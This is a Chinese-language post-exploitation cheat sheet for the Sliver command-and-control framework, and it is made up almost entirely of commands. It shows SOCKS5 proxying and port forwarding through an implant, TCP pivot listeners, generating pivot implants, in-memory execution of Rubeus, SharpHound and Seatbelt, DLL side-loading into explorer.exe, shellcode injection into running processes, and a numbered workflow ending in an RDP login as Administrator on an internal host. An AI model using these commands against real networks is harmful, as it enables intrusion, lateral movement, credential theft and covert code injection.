# Sliver — 後滲透（Pivoting / Injection / BOF）

## SOCKS5 Proxy（內網橫向）

```bash
# 啟動 SOCKS5（需先 use <SESSION_ID>）
socks5 start --host 127.0.0.1 --port 1080

socks5                    # 列出所有 SOCKS5 Proxy
socks5 stop --id <ID>     # 停止 SOCKS5
```

**搭配 proxychains：**

```bash
# /etc/proxychains4.conf 加入
socks5 127.0.0.1 1080

# 透過 Implant 存取內網
proxychains nmap -sT -p 445,3389 172.16.1.0/24
proxychains crackmapexec smb 172.16.1.0/24
```

## Port Forwarding

```bash
# 正向：將本地 Port 轉發到目標網路內主機
portfwd add --remote 172.16.1.10:3389
portfwd add --remote 172.16.1.10:3389 --local-port 13389

portfwd              # 列出規則
portfwd rm --id <ID> # 刪除規則

# 使用範例（RDP 到內網主機）
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:Password
```

## Reverse Port Forwarding

```bash
# 目標上的 Port 轉發回 Kali（適合 Callback）
rportfwd add --bind-addr 0.0.0.0:8080 --forward-host 127.0.0.1 --forward-port 80
rportfwd             # 列出規則
```

## TCP Pivot（跳板機橫向）

```bash
# 在已有 Session 的跳板機上啟動 TCP Pivot Listener
pivots tcp --lhost 0.0.0.0 --lport 9001
pivots               # 列出 Pivots
pivots rm --id <ID>  # 刪除

# 生成透過 TCP Pivot 回連的 Implant
generate --tcp-pivot <PIVOT_HOST>:9001 --os windows
```

## Process Injection & 記憶體執行

### execute-assembly — .NET Assembly（不落地）

```bash
execute-assembly /path/to/Seatbelt.exe -group=all
execute-assembly /path/to/Rubeus.exe asktgt /user:admin /password:P@ss
execute-assembly /path/to/SharpHound.exe --CollectionMethods All
```

### inline-execute — BOF（記憶體內執行）

```bash
inline-execute /path/to/bof.o
inline-execute /path/to/bof.o arg1 arg2
```

### sideload — DLL Side-loading

```bash
sideload --process explorer.exe /path/to/payload.dll [export_func]
```

### spawndll — 生成子程序執行 DLL

```bash
spawndll /path/to/payload.dll [export_func]
```

### execute-shellcode — Shellcode 注入

```bash
execute-shellcode --pid <PID> /path/to/shellcode.bin  # 注入到指定程序
execute-shellcode /path/to/shellcode.bin              # 生成新程序注入
```

## BOF（Beacon Object Files）

BOF 是 COFF 格式小型物件檔，在 Implant 記憶體內直接執行，無需 Spawn 新程序，OPSEC 友善。

```bash
# 執行 BOF
inline-execute /path/to/bof.o

# 帶參數
inline-execute /path/to/bof.o "arg1" "arg2"
```

**常用 BOF 來源：**
- [TrustedSec Situational Awareness BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)
- Sliver Armory 內建套件

## 常用後滲透流程

```bash
# 1. 確認網路位置
ifconfig
netstat

# 2. 開啟 SOCKS5 Proxy
socks5 start --port 1080

# 3. 用 proxychains 掃內網
proxychains nmap -sT -p 445 192.168.1.0/24

# 4. 找到目標後 Port Forward 直連
portfwd add --remote 192.168.1.50:3389 --local-port 13389

# 5. RDP 進去
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:Password
```
